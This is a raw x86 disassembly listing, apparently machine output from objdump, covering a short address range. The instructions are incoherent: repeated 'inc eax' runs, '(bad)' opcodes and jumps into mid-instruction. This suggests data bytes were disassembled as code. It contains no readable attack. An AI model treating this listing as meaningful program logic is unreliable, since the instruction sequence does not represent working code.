  40441b:	inc    eax
  40441c:	inc    eax
  40441d:	inc    eax
  40441e:	inc    eax
  40441f:	inc    eax
  404420:	rol    DWORD PTR [eax+0x40],0x70
  404424:	xchg   esp,eax
  404425:	lds    edi,FWORD PTR [edi-0x40cdbf9e]
  40442b:	or     BYTE PTR ds:0x400dbf48,0x79
  404432:	push   eax
  404433:	pop    eax
  404434:	retf   
  404435:	add    eax,0x4030c020
  40443a:	mov    edi,0x40004040
  40443f:	inc    eax
  404440:	inc    eax
  404441:	inc    eax
  404442:	inc    eax
  404443:	inc    eax
  404444:	fadd   DWORD PTR [ecx-0x9]
  404447:	test   eax,0x5224066
  40444c:	mov    eax,ds:0x87b04f98
  404451:	inc    eax
  404452:	aas    
  404453:	mov    esi,0x15434c3b
  404458:	inc    eax
  404459:	inc    eax
  40445a:	inc    eax
  40445b:	inc    eax
  40445c:	inc    eax
  40445d:	inc    eax
  40445e:	inc    eax
  40445f:	inc    eax
  404460:	inc    eax
  404461:	inc    eax
  404462:	pushf  
  404463:	inc    eax
  404464:	dec    esp
  404465:	sub    DWORD PTR [eax+0x40c95162],ebp
  40446b:	jg     0x404482
  40446d:	nop
  40446e:	inc    eax
  40446f:	aad    0xdc
  404471:	push   ecx
  404472:	test   BYTE PTR [ebx-0x6ffdf0d9],0x6b
  404479:	inc    esi
  40447a:	cmp    DWORD PTR [esi-0x7a],edi
  40447d:	push   ecx
  40447e:	push   ecx
  40447f:	jo     0x4044b5
  404481:	or     ah,BYTE PTR [edx+0x40]
  404484:	inc    eax
  404485:	inc    eax
  404486:	inc    eax
  404487:	inc    eax
  404488:	inc    eax
  404489:	int3   
  40448a:	jne    0x4044cc
  40448c:	dec    ebx
  40448d:	inc    ecx
  40448e:	jo     0x404440
  404490:	xor    al,0x6a
  404492:	aam    0x4a
  404494:	jle    0x4044d8
  404496:	sub    BYTE PTR gs:[ebp+0x48],al
  40449a:	(bad)  
  40449b:	rol    BYTE PTR [eax+eax*2+0x68],0x45
  4044a0:	ss add eax,0x40c10040
  4044a6:	inc    eax
  4044a7:	inc    eax
  4044a8:	inc    eax
  4044a9:	add    BYTE PTR [eax+0x4d],al
  4044ac:	dec    edi
  4044ad:	jge    0x4044d3
  4044af:	idiv   DWORD PTR [esi+0x1babca76]
  4044b5:	(bad)  
  4044b6:	push   cs
  4044b7:	push   0x41483490
  4044bc:	sub    eax,0x4040407d
  4044c1:	inc    eax
  4044c2:	inc    eax
  4044c3:	inc    eax
  4044c4:	inc    eax
  4044c5:	inc    eax
  4044c6:	inc    DWORD PTR [eax+0x40]
  4044c9:	(bad)  
  4044ca:	cmp    eax,DWORD PTR [ebp+0x15]
  4044cd:	mov    edi,0x51305948
  4044d2:	cmp    al,0x36
  4044d4:	enter  0x9a05,0x7a
  4044d8:	push   cs
  4044d9:	lahf   
  4044da:	mov    edx,0x40866003
  4044df:	inc    eax
  4044e0:	inc    eax
  4044e1:	inc    eax
  4044e2:	inc    eax
  4044e3:	inc    eax
  4044e4:	inc    eax
  4044e5:	inc    eax
  4044e6:	inc    eax
  4044e7:	inc    eax
  4044e8:	lds    edx,FWORD PTR [eax-0x5417aebf]
  4044ee:	add    BYTE PTR [ebx-0x12],0x7a
  4044f2:	inc    esi
  4044f3:	lahf   
  4044f4:	inc    ecx
  4044f5:	jo     0x4044ba
  4044f7:	cli    
  4044f8:	test   al,0x7e
  4044fa:	inc    esi
  4044fb:	out    dx,eax
  4044fc:	push   eax
  4044fd:	(bad)  
  4044fe:	dec    eax
  4044ff:	push   esp
  404500:	adc    DWORD PTR [ecx+0x2b],edi
  404503:	push   ecx
  404504:	dec    esi
  404505:	jo     0x40451c
  404507:	bound  eax,QWORD PTR [ecx-0x10]
  40450a:	inc    eax
  40450b:	inc    eax
  40450c:	inc    eax
  40450d:	inc    eax
  40450e:	inc    eax
  40450f:	inc    eax
  404510:	inc    eax
  404511:	inc    eax
  404512:	add    BYTE PTR [edi+ebx*4+0x50],dh
  404516:	cmp    al,0xfe
  404518:	retf   
  404519:	cmp    DWORD PTR [ecx+0x40],0x4f655c51
  404520:	dec    esp
  404521:	inc    eax
  404522:	inc    eax
  404523:	inc    eax
  404524:	inc    eax
  404525:	inc    eax
  404526:	inc    eax
  404527:	and    eax,0xc3404040
  40452c:	outs   dx,BYTE PTR ds:[esi]
  40452d:	push   es
  40452e:	lahf   
  40452f:	cmp    eax,0xaccc4a6d
  404534:	js     0x404576
  404536:	mov    ebx,DWORD PTR [eax+edi*1]
  404539:	aas    
  40453a:	xor    al,BYTE PTR [edx+ebp*8+0x40]
  40453e:	inc    eax
  40453f:	inc    eax
  404540:	inc    eax
  404541:	inc    eax
  404542:	inc    eax
  404543:	inc    eax
  404544:	inc    eax
  404545:	inc    eax
  404546:	inc    eax
  404547:	arpl   WORD PTR [ecx-0x33],dx
  40454a:	or     DWORD PTR [edx],ebx
  40454c:	bound  ebx,QWORD PTR [esi+0xc770678]
  404552:	stc    
  404553:	mov    ecx,0x406ad0c9
  404558:	jno    0x404546
  40455a:	xchg   edx,eax
  40455b:	ret    
  40455c:	imul   eax,DWORD PTR es:[eax+0x24],0x4040e95e
  404564:	inc    eax
  404565:	inc    eax
  404566:	inc    eax
  404567:	inc    eax
  404568:	rol    DWORD PTR [eax+0x40],0x8a
  40456c:	dec    eax
  40456d:	mov    ah,0x8c
  40456f:	inc    eax
  404570:	ret    0xa811
  404573:	fs or  eax,0x4040660d
  404579:	loope  0x40458b
  40457b:	dec    eax
  40457c:	dec    bl
  40457e:	outs   dx,DWORD PTR ds:[esi]
  40457f:	pusha  
  404580:	inc    eax
  404581:	inc    eax
  404582:	add    BYTE PTR [eax+0x40],al
  404585:	inc    eax
  404586:	inc    eax
  404587:	inc    eax
  404588:	inc    eax
  404589:	inc    ebp
  40458a:	mov    ah,0xfd
  40458c:	or     eax,0x404ab84f
  404591:	xor    eax,0x53666f69
  404596:	inc    ebx
  404597:	inc    esp
  404598:	inc    eax
  404599:	cs inc ecx
  40459b:	push   edx
  40459c:	inc    eax
  40459d:	inc    eax
  40459e:	inc    eax
  40459f:	inc    eax
  4045a0:	inc    eax
  4045a1:	inc    eax
  4045a2:	inc    eax
  4045a3:	inc    eax
  4045a4:	inc    eax
  4045a5:	inc    eax
  4045a6:	mov    bh,BYTE PTR [ebx+edx*1]
  4045a9:	xchg   BYTE PTR [eax],ah
  4045ab:	inc    eax
  4045ac:	lock push ebx
  4045ae:	bound  eax,QWORD PTR [ecx]
  4045b0:	push   esp
  4045b1:	lods   al,BYTE PTR ds:[esi]
  4045b2:	inc    eax
  4045b3:	xor    bh,BYTE PTR [ebp+0x53b880c0]
  4045b9:	adc    eax,0x40673a40
  4045be:	inc    eax
  4045bf:	inc    eax
  4045c0:	inc    eax
  4045c1:	inc    eax
  4045c2:	inc    eax
  4045c3:	int3   
  4045c4:	jne    0x404606
  4045c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4045c7:	sub    bl,al
  4045c9:	mov    edi,0x404040cb
  4045ce:	test   al,0x62
  4045d0:	dec    eax
  4045d1:	cmc    
  4045d2:	inc    eax
  4045d3:	jne    0x404600
  4045d5:	pusha  
  4045d6:	adc    dh,BYTE PTR ds:0xb2880905
  4045dc:	inc    eax
  4045dd:	dec    eax
  4045de:	mov    eax,0x4652fe40
  4045e3:	jne    0x404608
  4045e5:	xor    eax,DWORD PTR [ecx-0x6c]
  4045e8:	dec    edi
  4045e9:	inc    eax
  4045ea:	add    cl,al
  4045ec:	inc    eax
  4045ed:	inc    eax
  4045ee:	inc    eax
  4045ef:	inc    eax
  4045f0:	add    BYTE PTR [eax-0x38],al
  4045f3:	jle    0x404596
  4045f5:	add    dl,BYTE PTR ss:0xe8cbac3d
  4045fc:	jne    0x40463e
  4045fe:	jae    0x404648
  404600:	ret    
  404601:	retf   
  404602:	mov    edi,0x42119021
  404607:	push   ebx
  404608:	push   0x7588bf15
  40460d:	and    al,BYTE PTR [eax+0x40]
  404610:	inc    eax
  404611:	inc    eax
  404612:	inc    eax
  404613:	inc    eax
  404614:	inc    eax
  404615:	inc    eax
  404616:	inc    DWORD PTR [eax-0xd]
  404619:	shl    DWORD PTR ds:0xf162ca50,0x72
  404620:	jb     0x40464e
  404622:	inc    eax
  404623:	inc    eax
  404624:	sbb    esp,eax
  404626:	jne    0x40466f
  404628:	lahf   
  404629:	gs cwde 
  40462b:	inc    ecx
  40462c:	test   al,0x4f
  40462e:	call   0x3dc788a1
  404633:	rcl    BYTE PTR [eax],0xe8
  404636:	jne    0x404678
  404638:	xchg   edx,eax
  404639:	inc    eax
  40463a:	inc    eax
  40463b:	inc    eax
  40463c:	inc    eax
  40463d:	inc    eax
  40463e:	inc    eax
  40463f:	inc    eax
  404640:	inc    eax
  404641:	inc    eax
  404642:	inc    eax
  404643:	inc    edi
  404644:	ret    
  404645:	push   0x78df3ab4
  40464a:	pop    edi
  40464b:	xor    eax,0xac469631
  404650:	jne    0x40466e
  404652:	das    
  404653:	jno    0x40468a
  404655:	dec    esp
  404656:	inc    eax
  404657:	add    eax,0xb88240cd
  40465c:	dec    ebp
  40465d:	mov    eax,ds:0x2875c944
  404662:	push   edi
  404663:	ret    
  404664:	adc    WORD PTR [ebx+0x48],0x2437
  40466a:	inc    eax
  40466b:	inc    eax
  40466c:	inc    eax
  40466d:	inc    eax
  40466e:	inc    eax
  40466f:	inc    eax
  404670:	inc    eax
  404671:	inc    eax
  404672:	add    ch,bl
  404674:	dec    edx
  404675:	cmp    BYTE PTR [ebx-0x35],bh
  404678:	inc    ecx
  404679:	jne    0x4046bb
  40467b:	icebp  
  40467c:	inc    esp
  40467d:	rol    BYTE PTR [ebp-0x54],1
  404680:	push   ebx
  404681:	inc    eax
  404682:	inc    eax
  404683:	inc    eax
  404684:	inc    eax
  404685:	inc    eax
  404686:	inc    eax
  404687:	and    eax,0x26404040
  40468c:	and    al,0x4d
  40468e:	inc    BYTE PTR [esi+ebp*1+0x2a753469]
  404695:	nop
  404696:	dec    edi
  404697:	inc    ebx
  404698:	mov    cl,0xf2
  40469a:	and    BYTE PTR cs:[eax+eiz*2],ch
  40469e:	inc    esp
  40469f:	inc    eax
  4046a0:	inc    eax
  4046a1:	inc    eax
  4046a2:	inc    eax
  4046a3:	inc    eax
  4046a4:	inc    eax
  4046a5:	inc    eax
  4046a6:	inc    eax
  4046a7:	inc    eax
  4046a8:	inc    eax
  4046a9:	and    al,0xc8
  4046ab:	(bad)  
  4046ac:	les    esi,FWORD PTR [ebp+0x40]
  4046af:	sub    al,0x50
  4046b1:	aad    0xe7
  4046b3:	inc    eax
  4046b4:	test   al,0x64
  4046b6:	aaa    
  4046b7:	push   ecx
  4046b8:	adc    al,0x68
  4046ba:	enter  0x4b74,0x75
  4046be:	les    eax,FWORD PTR [edi-0x35]
  4046c1:	and    DWORD PTR [ecx+0x5a],ebx
  4046c4:	inc    eax
  4046c5:	inc    eax
  4046c6:	inc    eax
  4046c7:	inc    eax
  4046c8:	inc    eax
  4046c9:	inc    eax
  4046ca:	rol    DWORD PTR [eax+0x40],0x2a
  4046ce:	inc    esp
  4046cf:	dec    eax
  4046d0:	icebp  
  4046d1:	dec    ebx
  4046d2:	arpl   WORD PTR [ecx+0x79],ax
  4046d5:	push   eax
  4046d6:	je     0x404749
  4046d8:	loopne 0x4046a5
  4046da:	inc    eax
  4046db:	cmp    eax,0x40004040
  4046e0:	inc    eax
  4046e1:	inc    eax
  4046e2:	inc    eax
  4046e3:	inc    eax
  4046e4:	inc    eax
  4046e5:	cmp    BYTE PTR [edx],ch
  4046e7:	sahf   
  4046e8:	inc    eax
  4046e9:	aas    
  4046ea:	sub    BYTE PTR [edx+0x77],0x65
  4046ee:	inc    eax
  4046ef:	je     0x40476b
  4046f1:	aaa    
  4046f2:	bound  eax,QWORD PTR [eax+0x40]
  4046f5:	inc    eax
  4046f6:	inc    eax
  4046f7:	inc    eax
  4046f8:	inc    eax
  4046f9:	inc    eax
  4046fa:	inc    eax
  4046fb:	inc    eax
  4046fc:	inc    eax
  4046fd:	aad    0x73
  4046ff:	inc    esp
  404700:	inc    ebp
  404701:	frstor [ecx*2-0x19b49d78]
  404708:	bnd jb 0x40474b
  40470b:	imul   DWORD PTR [ebx]
  40470d:	arpl   bp,bx
  40470f:	inc    eax
  404710:	inc    eax
  404711:	inc    eax
  404712:	inc    eax
  404713:	inc    eax
  404714:	inc    eax
  404715:	int3   
  404716:	jne    0x404758
  404718:	and    DWORD PTR [esp+eax*1],edi
  40471b:	das    
  40471c:	dec    ebp
  40471d:	xor    DWORD PTR [eax-0x9],0xe2716263
  404724:	(bad)  
  404725:	fisub  WORD PTR [edx+0x4f]
  404728:	test   eax,0x4da89974
  40472d:	inc    eax
  40472e:	xchg   ecx,eax
  40472f:	jnp    0x404771
  404731:	add    cl,al
  404733:	inc    eax
  404734:	inc    eax
  404735:	inc    eax
  404736:	inc    eax
  404737:	add    BYTE PTR [eax-0x58],al
  40473a:	push   0xa2ff4071
  40473f:	int3   
  404740:	inc    ecx
  404741:	out    dx,eax
  404742:	(bad)  
  404743:	cld    
  404744:	ins    DWORD PTR es:[edi],dx
  404745:	jno    0x4046c8
  404747:	fnstsw WORD PTR [edi]
  404749:	mov    es,WORD PTR [ebx+0x40]
  40474c:	inc    eax
  40474d:	idiv   DWORD PTR [ebx-0x38]
  404750:	ins    BYTE PTR es:[edi],dx
  404751:	bound  ebp,QWORD PTR [edi]
  404753:	inc    eax
  404754:	cs dec esi
  404756:	retf   
  404757:	inc    esp
  404758:	and    DWORD PTR [eax-0x60bfbf03],esp
  40475e:	addr16 inc eax
  404760:	inc    eax
  404761:	inc    eax
  404762:	inc    eax
  404763:	inc    eax
  404764:	inc    eax
  404765:	inc    eax
  404766:	inc    eax
  404767:	inc    DWORD PTR [eax+0x25]
  40476a:	dec    ebx
  40476b:	or     eax,0x56296cfa
  404770:	ss out dx,eax
  404772:	std    
  404773:	leave  
  404774:	enter  0x4040,0x93
  404778:	inc    ecx
  404779:	test   al,0x69
  40477b:	inc    edx
  40477c:	and    BYTE PTR [eax+0x27],al
  40477f:	push   edi
  404780:	mov    al,0x10
  404782:	pushf  
  404783:	inc    ecx
  404784:	ins    BYTE PTR es:[edi],dx
  404785:	adc    al,al
  404787:	adc    DWORD PTR [eax+0x40],eax
  40478a:	inc    eax
  40478b:	inc    eax
  40478c:	inc    eax
  40478d:	inc    eax
  40478e:	inc    eax
  40478f:	inc    eax
  404790:	inc    eax
  404791:	inc    eax
  404792:	cmp    eax,0x3c9c8cb4
  404797:	inc    eax
  404798:	inc    eax
  404799:	inc    eax
  40479a:	ret    
  40479b:	add    eax,0x7c66704b
  4047a0:	xor    dl,BYTE PTR [eax+0x6d]
  4047a3:	retf   
  4047a4:	shl    DWORD PTR [ebp+0x0],1
  4047a7:	repz inc eax
  4047a9:	mov    edi,0x41bf4334
  4047ae:	(bad)  
  4047af:	js     0x4047d2
  4047b1:	inc    eax
  4047b2:	inc    eax
  4047b3:	inc    eax
  4047b4:	inc    eax
  4047b5:	inc    eax
  4047b6:	inc    eax
  4047b7:	inc    eax
  4047b8:	inc    eax
  4047b9:	add    BYTE PTR [ecx+0x45],bh
  4047bc:	or     DWORD PTR [eax+0x40c9dd20],ecx
  4047c2:	push   esi
  4047c3:	add    ch,BYTE PTR [eax]
  4047c5:	ret    
  4047c6:	mov    al,ds:0x112d7840
  4047cb:	and    al,0xea
  4047cd:	xchg   edi,eax
  4047ce:	add    eax,0x564017cc
  4047d3:	add    edx,DWORD PTR [eax-0x55]
  4047d6:	xchg   DWORD PTR [eax+0x40],eax
  4047d9:	inc    eax
  4047da:	inc    eax
  4047db:	inc    eax
  4047dc:	inc    eax
  4047dd:	and    eax,0xcf404040
  4047e2:	jbe    0x404844
  4047e4:	fwait
  4047e5:	bound  ax,DWORD PTR [ebp+0x49]
  4047e9:	sub    dl,bh
  4047eb:	inc    eax
  4047ec:	and    al,0x25
  4047ee:	inc    esp
  4047ef:	stos   DWORD PTR es:[edi],eax
  4047f0:	xor    edx,DWORD PTR [ecx+0x40]
  4047f3:	inc    eax
  4047f4:	xor    DWORD PTR [edx-0x28],esp
  4047f7:	mov    esp,0x7b409842
  4047fc:	pop    edx
  4047fd:	push   edi
  4047fe:	dec    ebp
  4047ff:	inc    ebp
  404800:	and    ah,BYTE PTR [edi+0x40]
  404803:	inc    eax
  404804:	ror    al,1
  404806:	inc    ebp
  404807:	inc    eax
  404808:	inc    eax
  404809:	inc    eax
  40480a:	inc    eax
  40480b:	inc    eax
  40480c:	inc    eax
  40480d:	inc    eax
  40480e:	inc    eax
  40480f:	inc    eax
  404810:	inc    eax
  404811:	pusha  
  404812:	adc    al,0xa0
  404814:	push   eax
  404815:	cmp    BYTE PTR [esp+edi*1],ch
  404818:	aad    0xd0
  40481a:	bound  eax,QWORD PTR ds:0xa8234040
  404820:	inc    eax
  404821:	inc    eax
  404822:	inc    eax
  404823:	inc    eax
  404824:	inc    eax
  404825:	inc    eax
  404826:	rol    DWORD PTR [eax+0x40],0x68
  40482a:	bound  edi,QWORD PTR [ebp-0x35]
  40482d:	inc    eax
  40482e:	xor    dl,dh
  404830:	adc    DWORD PTR [eax+edx*4+0x42],eax
  404834:	inc    esp
  404835:	add    BYTE PTR [eax+0x7a],al
  404838:	cmp    BYTE PTR fs:[ebx-0x80],bh
  40483c:	inc    ecx
  40483d:	inc    eax
  40483e:	jo     0x40487a
  404840:	or     BYTE PTR [ecx+0x4016c34c],dl
  404846:	inc    eax
  404847:	add    bl,cl
  404849:	ins    BYTE PTR es:[edi],dx
  40484a:	add    eax,0x40406841
  40484f:	xor    DWORD PTR [eax+0x40],eax
  404852:	add    BYTE PTR [eax+0x40],al
  404855:	inc    eax
  404856:	inc    eax
  404857:	inc    eax
  404858:	inc    eax
  404859:	mov    esp,0x6363fed5
  40485e:	jnp    0x4048d2
  404860:	inc    ebx
  404861:	inc    esp
  404862:	adc    BYTE PTR [edi+0x38],cl
  404865:	cmp    ch,bh
  404867:	inc    eax
  404868:	shl    dh,1
  40486a:	xchg   esp,eax
  40486b:	push   ecx
  40486c:	fs test al,0x7b
  40486f:	jp     0x40489a
  404871:	inc    eax
  404872:	inc    eax
  404873:	inc    eax
  404874:	inc    eax
  404875:	inc    eax
  404876:	inc    eax
  404877:	inc    eax
  404878:	inc    eax
  404879:	inc    eax
  40487a:	inc    eax
  40487b:	add    al,0x1d
  40487d:	(bad)  
  40487e:	stos   BYTE PTR es:[edi],al
  40487f:	iret   
  404880:	lds    eax,FWORD PTR [eax-0x8]
  404883:	bound  esp,QWORD PTR [esi]
  404885:	inc    ebp
  404886:	xchg   ecx,eax
  404887:	sub    bh,BYTE PTR [edx+0x34]
  40488a:	mov    cl,0x11
  40488c:	bound  eax,QWORD PTR [eax+0x40]
  40488f:	inc    eax
  404890:	inc    eax
  404891:	inc    eax
  404892:	inc    eax
  404893:	int3   
  404894:	jne    0x4048d6
  404896:	mov    ecx,0x40224464
  40489b:	and    al,0xcb
  40489d:	adc    cl,BYTE PTR [eax+0x28782611]
  4048a3:	jge    0x404861
  4048a5:	mov    eax,0xcaddf758
  4048aa:	inc    eax
  4048ab:	push   esp
  4048ac:	clc    
  4048ad:	loopne 0x4048ef
  4048af:	add    cl,al
  4048b1:	inc    eax
  4048b2:	inc    eax
  4048b3:	inc    eax
  4048b4:	inc    eax
  4048b5:	add    BYTE PTR [eax-0x47],al
  4048b8:	inc    edx
  4048b9:	in     al,0x77
  4048bb:	cmc    
  4048bc:	fisttp WORD PTR [edi-0x576776da]
  4048c2:	mov    dh,0x5a
  4048c4:	inc    eax
  4048c5:	inc    eax
  4048c6:	inc    eax
  4048c7:	inc    eax
  4048c8:	inc    eax
  4048c9:	inc    eax
  4048ca:	inc    eax
  4048cb:	inc    eax
  4048cc:	inc    DWORD PTR [eax+0x4e]
  4048cf:	outs   dx,BYTE PTR gs:[esi]
  4048d1:	popa   
  4048d2:	enter  0x7711,0x46
  4048d6:	xor    al,0xb0
  4048d8:	dec    ecx
  4048d9:	hlt    
  4048da:	bound  esp,QWORD PTR [ebp-0x67]
  4048dd:	xor    DWORD PTR [ecx+0x15],ebp
  4048e0:	lds    esp,FWORD PTR [edx+0x36]
  4048e3:	ret    
  4048e4:	ja     0x404927
  4048e6:	sahf   
  4048e7:	aad    0x74
  4048e9:	inc    esi
  4048ea:	mov    esi,0x40404040
  4048ef:	inc    eax
  4048f0:	inc    eax
  4048f1:	inc    eax
  4048f2:	inc    eax
  4048f3:	inc    eax
  4048f4:	inc    eax
  4048f5:	retf   
  4048f6:	cld    
  4048f7:	shr    DWORD PTR [ecx-0x46],cl
  4048fa:	xor    al,0x44
  4048fc:	in     eax,0x41
  4048fe:	ja     0x404912
  404900:	mov    bl,0x2c
  404902:	dec    edi
  404903:	ins    BYTE PTR es:[edi],dx
  404904:	inc    eax
  404905:	inc    eax
  404906:	inc    eax
  404907:	inc    eax
  404908:	inc    eax
  404909:	inc    eax
  40490a:	inc    eax
  40490b:	inc    eax
  40490c:	add    BYTE PTR [edx-0xb],dl
  40490f:	fild   QWORD PTR [ebp-0x33]
  404912:	hlt    
  404913:	mov    dh,0x72
  404915:	pop    eax
  404916:	repz ja 0x40498c
  404919:	push   ebp
  40491a:	gs pop edx
  40491c:	xor    al,0x2
  40491e:	pusha  
  40491f:	ret    0xeb71
  404922:	xor    ebp,DWORD PTR [ecx+ecx*4]
  404925:	retf   
  404926:	push   ebp
  404927:	ja     0x40496e
  404929:	repnz xor al,0xbe
  40492c:	inc    eax
  40492d:	inc    eax
  40492e:	inc    eax
  40492f:	inc    eax
  404930:	inc    eax
  404931:	inc    eax
  404932:	and    eax,0xc5404040
  404937:	mov    edi,0x68f12563
  40493c:	inc    eax
  40493d:	mov    eax,0x779b2f4c
  404942:	inc    ecx
  404943:	dec    ebp
  404944:	push   0xab520da8
  404949:	or     BYTE PTR [ecx-0x1efc6a1],dh
  40494f:	or     eax,0x4d53770f
  404954:	inc    edx
  404955:	mov    ah,0x4f
  404957:	inc    eax
  404958:	inc    eax
  404959:	inc    eax
  40495a:	inc    eax
  40495b:	inc    eax
  40495c:	inc    eax
  40495d:	inc    eax
  40495e:	inc    eax
  40495f:	inc    eax
  404960:	inc    eax
  404961:	leave  
  404962:	loop   0x4049cf
  404964:	pop    edi
  404965:	pop    edi
  404966:	inc    ebp
  404967:	inc    edx
  404968:	jp     0x40491a
  40496a:	xor    DWORD PTR [edi+0x42],0x4694b040
  404971:	or     eax,0x531b4eb2
  404976:	push   edx
  404977:	ins    BYTE PTR es:[edi],dx
  404978:	pop    edi
  404979:	retf   
  40497a:	loope  0x4049f2
  40497c:	inc    ebx
  40497d:	push   esi
  40497e:	cmp    al,0x62
  404980:	sbb    al,0x42
  404982:	bound  esi,QWORD PTR [ecx+0x40404011]
  404988:	inc    eax
  404989:	inc    eax
  40498a:	inc    eax
  40498b:	rol    DWORD PTR [eax+0x40],0x5f
  40498f:	xor    al,0x41
  404991:	or     DWORD PTR ds:0xff76,edx
  404996:	scas   eax,DWORD PTR es:[edi]
  404997:	inc    eax
  404998:	arpl   WORD PTR fs:[eax-0x54],si
  40499c:	xchg   esp,eax
  40499d:	push   cs
  40499e:	jecxz  0x404a04
  4049a0:	push   0x7662626c
  4049a5:	icebp  
  4049a6:	cmp    edi,DWORD PTR [eax]
  4049a8:	cwde   
  4049a9:	arpl   sp,ax
  4049ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4049ac:	inc    eax
  4049ad:	inc    eax
  4049ae:	add    BYTE PTR [eax+0x40],al
  4049b1:	inc    eax
  4049b2:	inc    eax
  4049b3:	inc    eax
  4049b4:	inc    eax
  4049b5:	test   DWORD PTR [edi+0x22],0x4fd10542
  4049bc:	adc    eax,0x45fdb076
  4049c1:	leave  
  4049c2:	test   al,0xa4
  4049c4:	retf   
  4049c5:	fidivr DWORD PTR [edx+0x43]
  4049c8:	inc    eax
  4049c9:	inc    eax
  4049ca:	inc    eax
  4049cb:	inc    eax
  4049cc:	inc    eax
  4049cd:	inc    eax
  4049ce:	inc    eax
  4049cf:	inc    eax
  4049d0:	inc    eax
  4049d1:	inc    eax
  4049d2:	and    al,0x9c
  4049d4:	adc    BYTE PTR ds:0xbf437654,al
  4049da:	loope  0x4049e1
  4049dc:	sub    DWORD PTR [ebx+0x33],edi
  4049df:	cmp    eax,0xcbe023b0
  4049e4:	and    eax,DWORD PTR [edx-0x64]
  4049e7:	jbe    0x404a15
  4049e9:	pop    edi
  4049ea:	bound  eax,QWORD PTR [eax+0x40]
  4049ed:	inc    eax
  4049ee:	inc    eax
  4049ef:	inc    eax
  4049f0:	inc    eax
  4049f1:	int3   
  4049f2:	jne    0x404a34
  4049f4:	xchg   esp,eax
  4049f5:	jne    0x404a08
  4049f7:	or     eax,0x77a8a20
  4049fc:	adc    eax,0x767b30dc
  404a01:	push   ecx
  404a02:	aas    
  404a03:	fmul   st,st(1)
  404a05:	loopne 0x404a1c
  404a07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404a08:	add    esi,edx
  404a0a:	cmp    al,BYTE PTR [ecx-0x50]
  404a0d:	int3   
  404a0e:	leave  
  404a0f:	or     eax,0x407f3176
  404a14:	add    cl,al
  404a16:	inc    eax
  404a17:	inc    eax
  404a18:	inc    eax
  404a19:	inc    eax
  404a1a:	add    BYTE PTR [eax+0x2c],al
  404a1d:	adc    eax,0x66cb48a8
  404a22:	push   eax
  404a23:	lods   eax,DWORD PTR ss:[esi]
  404a25:	imul   esp,eax,0x10
  404a28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404a29:	jbe    0x404a22
  404a2b:	jg     0x4049af
  404a2d:	in     al,0xed
  404a2f:	inc    ecx
  404a30:	dec    ecx
  404a31:	dec    ecx
  404a32:	xchg   edi,eax
  404a33:	and    ebp,DWORD PTR [eax]
  404a35:	adc    eax,0x75cf5ea8
  404a3a:	dec    eax
  404a3b:	inc    eax
  404a3c:	inc    eax
  404a3d:	inc    eax
  404a3e:	inc    eax
  404a3f:	inc    eax
  404a40:	inc    eax
  404a41:	inc    eax
  404a42:	inc    eax
  404a43:	inc    DWORD PTR [eax+0x3f]
  404a46:	fmulp  st(3),st
  404a48:	xchg   esi,eax
  404a49:	and    al,0xd4
  404a4b:	lods   al,BYTE PTR ds:[esi]
  404a4c:	jb     0x404a0d
  404a4e:	push   ecx
  404a4f:	in     al,0xdd
  404a51:	inc    eax
  404a52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404a53:	inc    eax
  404a54:	inc    eax
  404a55:	inc    eax
  404a56:	inc    eax
  404a57:	inc    eax
  404a58:	inc    eax
  404a59:	inc    eax
  404a5a:	inc    eax
  404a5b:	inc    eax
  404a5c:	inc    eax
  404a5d:	jne    0x404a93
  404a5f:	dec    ebp
  404a60:	ror    BYTE PTR ds:0x8ffaa8cf,0x50
  404a67:	adc    esp,DWORD PTR [esi+0x354bd0c9]
  404a6d:	jne    0x404adf
  404a6f:	jle    0x404abf
  404a71:	push   eax
  404a72:	inc    eax
  404a73:	inc    eax
  404a74:	inc    eax
  404a75:	inc    eax
  404a76:	inc    eax
  404a77:	inc    eax
  404a78:	inc    eax
  404a79:	inc    eax
  404a7a:	add    dh,dl
  404a7c:	xor    eax,0xb325f2f1
  404a81:	test   al,0x8
  404a83:	stos   DWORD PTR es:[edi],eax
  404a84:	inc    ecx
  404a85:	pushf  
  404a86:	jne    0x404ad9
  404a88:	pop    esp
  404a89:	dec    ecx
  404a8a:	inc    ebx
  404a8b:	out    dx,al
  404a8c:	push   esi
  404a8d:	lods   al,BYTE PTR ds:[esi]
  404a8e:	aad    0xb1
  404a90:	push   eax
  404a91:	ret    
  404a92:	mov    BYTE PTR [ebx+0x9754c3c],ch
  404a98:	pop    es
  404a99:	ins    BYTE PTR es:[edi],dx
  404a9a:	or     eax,0x3862b0b8
  404a9f:	mov    cl,0x4d
  404aa1:	inc    eax
  404aa2:	inc    eax
  404aa3:	inc    eax
  404aa4:	inc    eax
  404aa5:	inc    eax
  404aa6:	inc    eax
  404aa7:	and    eax,0x5a404040
  404aac:	inc    ebp
  404aad:	inc    edx
  404aae:	or     eax,0xd00d75a9
  404ab3:	and    BYTE PTR [eax+0x7e],al
  404ab6:	leave  
  404ab7:	inc    edx
  404ab8:	sbb    edx,DWORD PTR [ebx-0x3bfaf9f0]
  404abe:	inc    eax
  404abf:	inc    eax
  404ac0:	inc    eax
  404ac1:	inc    eax
  404ac2:	inc    eax
  404ac3:	inc    eax
  404ac4:	inc    eax
  404ac5:	inc    eax
  404ac6:	inc    eax
  404ac7:	inc    eax
  404ac8:	dec    eax
  404ac9:	aad    0x75
  404acb:	dec    esi
  404acc:	lds    edi,FWORD PTR [eax+0x4441b824]
  404ad2:	jle    0x404aa6
  404ad4:	ficom  WORD PTR [edi+0x5b]
  404ad7:	adc    eax,0xef75f26f
  404adc:	adc    BYTE PTR [edi],ch
  404ade:	xor    al,0xcb
  404ae0:	cmp    al,0xa8
  404ae2:	popa   
  404ae3:	cmp    BYTE PTR [eax+0x40],al
  404ae6:	inc    eax
  404ae7:	inc    eax
  404ae8:	inc    eax
  404ae9:	inc    eax
  404aea:	rol    DWORD PTR [eax+0x40],0xaa
  404aee:	xor    al,0x9c
  404af0:	dec    eax
  404af1:	bound  edx,QWORD PTR [edx]
  404af3:	jne    0x404b37
  404af5:	cmp    al,0xfa
  404af7:	adc    eax,0x4494a4c8
  404afc:	xor    DWORD PTR [esi],esi
  404afe:	sar    BYTE PTR [ebx-0x41],1
  404b01:	mov    esi,0x40004040
  404b06:	inc    eax
  404b07:	inc    eax
  404b08:	inc    eax
  404b09:	inc    eax
